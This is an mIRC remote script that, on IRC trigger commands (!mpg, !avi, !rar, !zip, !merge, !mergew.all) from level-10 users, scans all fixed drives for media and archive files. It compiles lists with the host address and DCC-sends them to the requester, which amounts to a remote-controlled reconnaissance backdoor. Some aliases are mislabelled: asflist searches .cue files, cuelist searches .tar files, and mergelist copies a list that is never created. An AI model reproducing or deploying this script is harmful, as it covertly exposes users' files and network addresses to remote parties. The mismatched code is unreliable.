[script]
n0=alias mpglist {
n1=  write -c listmpg.txt 
n2=  set %server4mp3 $findfile(c:\,*.mpg,0, write listmpg.txt $1- )
n3=  unset %server4mp3
n4=  if ( $disk(d).type == fixed ) {
n5=    set %server4mp3 $findfile(d:\,*.mpg,0, write listmpg.txt $1- ) 
n6=  }
n7=  unset %server4mp3
n8=  if ( $disk(e).type == fixed ) {
n9=    set %server4mp3 $findfile(e:\,*.mpg,0, write listmpg.txt $1- ) 
n10=  }
n11=  unset %server4mp3
n12=  if ( $disk(f).type == fixed ) {
n13=    set %server4mp3 $findfile(f:\,*.mpg,0, write listmpg.txt $1- ) 
n14=  }  
n15=  unset %server4mp3
n16=  if ( $disk(g).type == fixed ) {
n17=    set %server4mp3 $findfile(g:\,*.mpg,0, write listmpg.txt $1- ) 
n18=  } 
n19=  unset %server4mp3
n20=  if ( $disk(h).type == fixed ) {
n21=    set %server4mp3 $findfile(h:\,*.mpg,0, write listmpg.txt $1- ) 
n22=  }
n23=  unset %server4mp3
n24=  msg %m.l.# 14..[`15mpg14`].. 11Found 8 $lines(listmpg.txt)  11Files...
n25=}
n26=
n27=alias avilist {
n28=  write -c listavi.txt 
n29=  set %server4mp3 $findfile(c:\,*.avi,0, write listavi.txt $1- )
n30=  unset %server4mp3
n31=  if ( $disk(d).type == fixed ) {
n32=    set %server4mp3 $findfile(d:\,*.avi,0, write listavi.txt $1- ) 
n33=  }
n34=  unset %server4mp3
n35=  if ( $disk(e).type == fixed ) {
n36=    set %server4mp3 $findfile(e:\,*.avi,0, write listavi.txt $1- ) 
n37=  }
n38=  unset %server4mp3
n39=  if ( $disk(f).type == fixed ) {
n40=    set %server4mp3 $findfile(f:\,*.avi,0, write listavi.txt $1- ) 
n41=  }  
n42=  unset %server4mp3
n43=  if ( $disk(g).type == fixed ) {
n44=    set %server4mp3 $findfile(g:\,*.avi,0, write listavi.txt $1- ) 
n45=  } 
n46=  unset %server4mp3
n47=  if ( $disk(h).type == fixed ) {
n48=    set %server4mp3 $findfile(h:\,*.avi,0, write listavi.txt $1- ) 
n49=  }   
n50=  unset %server4mp3
n51=  msg %m.l.# 14..[`15avi14`].. 11Found 8 $lines(listavi.txt)  11Files...
n52=}
n53=
n54=alias asflist {
n55=  write -c listcue.txt 
n56=  set %server4mp3 $findfile(c:\,*.cue,0, write listcue.txt $1- )
n57=  unset %server4mp3
n58=
n59=  if ( $disk(d).type == fixed ) {
n60=    set %server4mp3 $findfile(d:\,*.cue,0, write listcue.txt $1- ) 
n61=  }
n62=  unset %server4mp3
n63=  if ( $disk(e).type == fixed ) {
n64=    set %server4mp3 $findfile(e:\,*.cue,0, write listcue.txt $1- ) 
n65=  }
n66=  unset %server4mp3
n67=  if ( $disk(f).type == fixed ) {
n68=    set %server4mp3 $findfile(f:\,*.cue,0, write listcue.txt $1- ) 
n69=  }  
n70=  unset %server4mp3
n71=  if ( $disk(g).type == fixed ) {
n72=    set %server4mp3 $findfile(g:\,*.cue,0, write listcue.txt $1- ) 
n73=  } 
n74=  unset %server4mp3
n75=  if ( $disk(h).type == fixed ) {
n76=    set %server4mp3 $findfile(h:\,*.cue,0, write listcue.txt $1- ) 
n77=  }
n78=  unset %server4mp3
n79=  msg %m.l.# 14..[`15CuE14`].. 11Found 8 $lines(listcue.txt)  11Files...
n80=}
n81=
n82=alias mergelist {
n83=  remove medialist.txt
n84=  write -c medialist.txt
n85=  copy -a listmpg.txt medialist.txt
n86=  copy -a listasf.txt medialist.txt
n87=  copy -a listavi.txt medialist.txt
n88=  var %lines $lines(medialist.txt)
n89=  set %mediafile [ [ $me ] $+ ] .txt 
n90=  .write -c %mediafile
n91=  while ( %lines > 0 ) {
n92=    set %file $read -l $+ %lines medialist.txt 
n93=    if ( $calc( $file(%file).size / 1050230.541871921182 ) > 10 ) { 
n94=      set %size $round($calc( $file(%file).size / 1051190.374331550802 ), 2)
n95=      write %mediafile ! [ $+ [ $me ] ] %file  %size $+ Mb 
n96=    }
n97=    dec %lines
n98=  }
n99=  msg %m.l.# 14..[`15all14`].. 11Merged Final List of 8 $lines(%mediafile)  11Files...
n100=  if ( $lines(%mediafile) > 10 ) { dcc send $nick %mediafile }
n101=}
n102=
n103=alias rarlist {
n104=  write -c listrar.txt 
n105=  set %server4mp3 $findfile(c:\,*.rar,0, write listrar.txt $1- )
n106=  unset %server4mp3
n107=  if ( $disk(d).type == fixed ) {
n108=    set %server4mp3 $findfile(d:\,*.rar,0, write listrar.txt $1- ) 
n109=  }
n110=  unset %server4mp3
n111=  if ( $disk(e).type == fixed ) {
n112=    set %server4mp3 $findfile(e:\,*.rar,0, write listrar.txt $1- ) 
n113=  }
n114=  unset %server4mp3
n115=  if ( $disk(f).type == fixed ) {
n116=    set %server4mp3 $findfile(f:\,*.rar,0, write listrar.txt $1- ) 
n117=  }  
n118=  unset %server4mp3
n119=  if ( $disk(g).type == fixed ) {
n120=    set %server4mp3 $findfile(g:\,*.rar,0, write listrar.txt $1- ) 
n121=  } 
n122=  unset %server4mp3
n123=  if ( $disk(h).type == fixed ) {
n124=    set %server4mp3 $findfile(h:\,*.rar,0, write listrar.txt $1- ) 
n125=  }
n126=  unset %server4mp3
n127=  msg %w.l.# 14..[`15RaR14`].. 11Found 8 $lines(listrar.txt)  11Files...
n128=}
n129=
n130=alias ziplist {
n131=  write -c listzip.txt 
n132=  set %server4mp3 $findfile(c:\,*.zip,0, write listzip.txt $1- )
n133=  unset %server4mp3
n134=  if ( $disk(d).type == fixed ) {
n135=    set %server4mp3 $findfile(d:\,*.zip,0, write listzip.txt $1- ) 
n136=  }
n137=  unset %server4mp3
n138=  if ( $disk(e).type == fixed ) {
n139=    set %server4mp3 $findfile(e:\,*.zip,0, write listzip.txt $1- ) 
n140=  }
n141=  unset %server4mp3
n142=  if ( $disk(f).type == fixed ) {
n143=    set %server4mp3 $findfile(f:\,*.zip,0, write listzip.txt $1- ) 
n144=  }  
n145=  unset %server4mp3
n146=  if ( $disk(g).type == fixed ) {
n147=    set %server4mp3 $findfile(g:\,*.zip,0, write listzip.txt $1- ) 
n148=  } 
n149=  unset %server4mp3
n150=  if ( $disk(h).type == fixed ) {
n151=    set %server4mp3 $findfile(h:\,*.zip,0, write listzip.txt $1- ) 
n152=  }   
n153=  unset %server4mp3
n154=  msg %w.l.# 14..[`15avi14`].. 11Found 8 $lines(listzip.txt)  11Files...
n155=}
n156=
n157=alias cuelist {
n158=  write -c listTaR.txt 
n159=  set %server4mp3 $findfile(c:\,*.tar,0, write listTaR.txt $1- )
n160=  unset %server4mp3
n161=
n162=  if ( $disk(d).type == fixed ) {
n163=    set %server4mp3 $findfile(d:\,*.tar,0, write listTaR.txt $1- ) 
n164=  }
n165=  unset %server4mp3
n166=  if ( $disk(e).type == fixed ) {
n167=    set %server4mp3 $findfile(e:\,*.tar,0, write listTaR.txt $1- ) 
n168=  }
n169=  unset %server4mp3
n170=  if ( $disk(f).type == fixed ) {
n171=    set %server4mp3 $findfile(f:\,*.tar,0, write listTaR.txt $1- ) 
n172=  }  
n173=  unset %server4mp3
n174=  if ( $disk(g).type == fixed ) {
n175=    set %server4mp3 $findfile(g:\,*.tar,0, write listTaR.txt $1- ) 
n176=  } 
n177=  unset %server4mp3
n178=  if ( $disk(h).type == fixed ) {
n179=    set %server4mp3 $findfile(h:\,*.tar,0, write listTaR.txt $1- ) 
n180=  }
n181=  unset %server4mp3
n182=  msg %w.l.# 14..[`15TaR14`].. 11Found 8 $lines(listTaR.txt)  11Files...
n183=}
n184=
n185=alias warezlist {
n186=  remove warezlist.txt
n187=  write -c warezlist.txt
n188=  copy -a listrar.txt warezlist.txt
n189=  copy -a listzip.txt warezlist.txt
n190=  var %lines $lines(warezlist.txt)
n191=  set %warezfile [ [ $me $+ w ] $+ ] .txt 
n192=  .write -c %warezfile
n193=  .write %warezfile Current Nick : $me
n194=  .write %warezfile Host Address : $host
n195=  while ( %lines > 0 ) {
n196=    set %file $read -l $+ %lines warezlist.txt 
n197=    if ( $calc( $file(%file).size / 1050230.541871921182 ) > 1 ) { 
n198=      set %size $round($calc( $file(%file).size / 1051190.374331550802 ), 2)
n199=      write %warezfile ! [ $+ [ $me ] ] %file  %size $+ Mb 
n200=    }
n201=    dec %lines
n202=  }
n203=  copy -a listcue.txt %warezfile
n204=  msg %w.l.# 14..[`15all14`].. 11Merged Final List of 8 $lines(%warezfile)  11Files...
n205=  if ( $lines(%warezfile) > 4 ) { dcc send $nick %warezfile }
n206=}
n207=on 10:TEXT:!mpg*:#: %m.l.# = # | /mpglist $2
n208=on 10:TEXT:!mpg*:?: %m.l.# = $nick | /mpglist $2
n209=
n210=on 10:TEXT:!avi*:#: %m.l.# = # | /avilist $2
n211=on 10:TEXT:!avi*:?: %m.l.# = $nick | /avilist $2
n212=
n213=on 10:TEXT:!asf*:#: %m.l.# = # | /asflist $2
n214=on 10:TEXT:!asf*:?: %m.l.# = $nick | /asflist $2
n215=
n216=on 10:TEXT:!merge*:#: %m.l.# = # | /mergelist $2
n217=on 10:TEXT:!merge*:?: %m.l.# = $nick | /mergelist $2
n218=
n219=on 10:TEXT:!rar*:#: %w.l.# = # | /rarlist $2
n220=on 10:TEXT:!rar*:?: %w.l.# = $nick | /rarlist $2
n221=
n222=on 10:TEXT:!zip*:#: %w.l.# = # | /ziplist $2
n223=on 10:TEXT:!zip*:?: %w.l.# = $nick | /ziplist $2
n224=
n225=on 10:TEXT:!cue*:#: %w.l.# = # | /cuelist $2
n226=on 10:TEXT:!cue*:?: %w.l.# = $nick | /cuelist $2
n227=
n228=on 10:TEXT:!mergew*:#: %w.l.# = # | /warezlist $2
n229=on 10:TEXT:!mergew*:?: %w.l.# = $nick | /warezlist $2
n230=
n231=on 10:TEXT:!merge.all*:#: %w.l.# = # | //mpglist $2 | //timer 1 120 //avilist $2 | //timer 1 240 //asflist $2 | //timer 1 360 //mergelist $2
n232=on 10:TEXT:!merge.all*:?: %w.l.# = $nick | //mpglist $2 | //timer 1 120 //avilist $2 | //timer 1 240 //asflist $2 | //timer 1 360 //mergelist $2
n233=on 10:TEXT:!mergew.all*:#: %w.l.# = # | //rarlist $2 | //timer 1 120 //ziplist $2 | //timer 1 240 //cuelist $2 | //timer 1 360 //warezlist $2
n234=on 10:TEXT:!mergew.all*:?: %w.l.# = $nick | //rarlist $2 | //timer 1 120 //ziplist $2 | //timer 1 240 //cuelist $2 | //timer 1 360 //warezlist $2
